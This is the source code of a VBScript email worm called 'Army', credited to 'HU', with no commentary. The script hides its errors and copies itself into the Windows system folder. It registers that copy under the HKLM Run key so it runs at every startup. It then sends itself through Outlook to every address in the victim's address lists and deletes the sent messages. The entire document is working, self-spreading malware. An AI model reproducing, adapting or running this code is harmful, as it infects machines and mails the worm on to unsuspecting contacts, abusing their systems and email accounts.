'Name of the worm : Army
'Author : HU
On Error Resume Next

Set lxvslwtn=CreateObject("Scripting.FileSystemObject")
Set nceiqkup=CreateObject("WScript.Shell")
Set cpy=lxvslwtn.GetFile(WScript.ScriptFullName)
cpy.Copy(lxvslwtn.GetSpecialFolder(1)&"\Copy.vbs")
r=("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\")
nceiqkup.RegWrite r,(lxvslwtn.GetSpecialFolder(1)&"\Copy.vbs")

Set pgnbceiq=CreateObject("Outlook.Application")
Set qiqirjsl=pgnbceiq.GetNameSpace("MAPI")
For Each C In qiqirjsl.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.Count
Set lxvrjslw=C.AddressEntries(D)
Set wupfkupf=pgnbceiq.CreateItem(0)
wupfkupf.To=lxvrjslw.Address
wupfkupf.Subject="Hi"
wupfkupf.Body="Hi"
wupfkupf.Attachments.Add(lxvslwtn.GetSpecialFolder(1)&"\Copy.vbs")
wupfkupf.DeleteAfterSubmit=True
If wupfkupf.To <> "" Then
wupfkupf.Send
End If
Next
End If
Next
